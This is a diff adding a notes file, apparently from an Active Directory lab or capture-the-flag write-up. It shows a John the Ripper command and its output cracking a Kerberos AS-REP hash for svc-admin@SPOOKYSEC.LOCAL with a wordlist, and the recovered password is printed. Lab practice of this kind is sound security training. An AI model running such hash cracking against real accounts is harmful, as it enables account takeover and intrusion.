@@ -1,0 +1,19 @@
+Commando: `john hash --fork=4 --wordlist=passwordlist.txt`
+
+Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
+Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 4 OpenMP threads per process (16 total across 4 processes)
+Node numbers 1-4 of 4 (fork)
+
+management2005   ($krb5asrep$svc-admin@SPOOKYSEC.LOCAL)
+
+4 1g 0:00:00:00 DONE (2022-01-18 12:59) 50.00g/s 102400p/s 102400c/s 102400C/s dollface..whitey
+2 0g 0:00:00:00 DONE (2022-01-18 12:59) 0g/s 584900p/s 584900c/s 584900C/s 03121992..pinkpimp
+Press 'q' or Ctrl-C to abort, almost any other key for status
+3 0g 0:00:00:00 DONE (2022-01-18 12:59) 0g/s 877350p/s 877350c/s 877350C/s 030979..pinkpiggy
+1 0g 0:00:00:00 DONE (2022-01-18 12:59) 0g/s 877350p/s 877350c/s 877350C/s 031383..pinkpurple
+Waiting for 3 children to terminate
+Session completed
+
